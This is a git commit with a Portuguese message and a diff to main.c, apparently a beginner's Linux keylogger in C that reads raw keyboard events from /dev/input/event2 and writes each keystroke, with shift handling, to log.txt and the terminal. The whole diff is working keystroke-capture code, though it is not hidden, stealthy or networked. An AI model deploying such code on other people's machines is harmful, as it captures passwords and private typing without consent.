8d79a1c54a3545a7a53c51e3a97221e8d7b3f4d3
Decay <0_0o@tutamail.com>
2026-04-08 07:59:05 -0300

    Resolvi problema de registro no arquivo log.txt pois estava ouvindo o /dev/input/event errado e não a tecla e algumas mmelhorias

--- main.c
+++ main.c
@@ -3,109 +3,101 @@
 #include <unistd.h>
 #include <linux/input.h>
 
-// vou fazer um array com as teclas basicas
-// vi isso num forum que é mais facil que if
 
-const char teclas[128] = {
+//  tabelas das teclas do teclado
+char teclas[200] = {
     0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0,
     0, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0,
     0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0,
     '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
 };
 
-// tentei fazer shift mas nao consegui fazer direito
-// vou deixar pra depois
-
-FILE *logfile;
-
 int main() {
-    int teclado;
+    int tec;
+    struct input_event e;
+    int shift = 0;
     
-    // tenta achar o teclado 
-    teclado = open("/dev/input/event1", O_RDONLY);
-    if(teclado == -1) {
-        teclado = open("/dev/input/event2", O_RDONLY);
-    }
-    if(teclado == -1) {
-        teclado = open("/dev/input/event0", O_RDONLY);
-    }
-    if(teclado == -1) {
-        printf("abre o teclado nao, tenta com sudo\n");
+    // no meu pc o input do teclado é event2 (depois crio um randomizer)
+    tec = open("/dev/input/event2", O_RDONLY);
+    
+    if(tec == -1) {
+        printf("abriu não, tenta com sudo\n");
         return 1;
     }
     
-    printf("teclado aberto! (aperta ctrl+c pra parar)\n");
+    printf("teclado funcionando, aperta ctrl+c pra parar\n");
     
-    logfile = fopen("log.txt", "a");
-    if(!logfile) {
-        printf("erro no arquivo\n");
+    FILE *log = fopen("log.txt", "w");
+    if(log == NULL) {
+        printf("deu erro no arquivo\n");
         return 1;
     }
-    
-    struct input_event ev;
-    int shift_pressed = 0; // tentei fazer shift mas nao ta funcionando bem
     
     while(1) {
-        read(teclado, &ev, sizeof(ev));
+        int r = read(tec, &e, sizeof(e));
         
-        if(ev.type == 1 && ev.value == 1) { // tecla apertada
+        if(r < 0) {
+            printf("erro na leitura\n");
+            break;
+        }
+        
+        // se for tecla
+        if(e.type == 1) {
             
-            // ve se é shift
-            if(ev.code == 42 || ev.code == 54) {
-                shift_pressed = 1;
+            // shift apertado
+            if(e.code == 42 || e.code == 54) {
+                if(e.value == 1) {
+                    shift = 1;
+                } else {
+                    shift = 0;
+                }
                 continue;
             }
             
-            // trata as teclas normais
-            if(ev.code >= 0 && ev.code < 128 && teclas[ev.code] != 0) {
-                char c = teclas[ev.code];
+            // so quando aperta (value=1)
+            if(e.value == 1) {
                 
-                // tenta fazer maiusculo (orovavel ta errado)
-                if(shift_pressed) {
-                    if(c >= 'a' && c <= 'z') {
-                        c = c - 32; // vira maiusculo
+                // tenta converter
+                if(e.code < 128 && teclas[e.code] != 0) {
+                    char letra = teclas[e.code];
+                    
+                    // tenta fazer maiusculo (funciona so letras)
+                    if(shift == 1) {
+                        if(letra >= 'a' && letra <= 'z') {
+                            letra = letra - 32;
+                        }
+                    }
+                    
+                    printf("%c", letra);
+                    fprintf(log, "%c", letra);
+                }
+                else {
+                    // teclas especiais
+                    if(e.code == 28) { // enter
+                        printf("\n");
+                        fprintf(log, "\n");
+                    }
+                    else if(e.code == 14) { // backspace
+                        printf("<BS>");
+                        fprintf(log, "<BS>");
+                    }
+                    else if(e.code == 57) { // espaço
+                        printf(" ");
+                        fprintf(log, " ");
+                    }
+                    else {
+                        printf("[%d]", e.code);
+                        fprintf(log, "[%d]", e.code);
                     }
                 }
                 
-                printf("%c", c);
-                fprintf(logfile, "%c", c);
+               
+                fflush(log);
             }
-            else {
-                // teclas especiais
-                switch(ev.code) {
-                    case 14:
-                        printf("<BS>");
-                        fprintf(logfile, "<BS>");
-                        break;
-                    case 28:
-                        printf("\n");
-                        fprintf(logfile, "\n");
-                        break;
-                    case 57:
-                        printf(" ");
-                        fprintf(logfile, " ");
-                        break;
-                    case 15:
-                        printf("<TAB>");
-                        fprintf(logfile, "<TAB>");
-                        break;
-                    default:
-                        printf("[%d]", ev.code);
-                        fprintf(logfile, "[%d]", ev.code);
-                        break;
-                }
-            }
-            
-            fflush(logfile);
-        }
-        
-        // quando solta o shift
-        if((ev.code == 42 || ev.code == 54) && ev.value == 0) {
-            shift_pressed = 0;
         }
     }
     
-    fclose(logfile);
-    close(teclado);
+    fclose(log);
+    close(tec);
     return 0;
 }
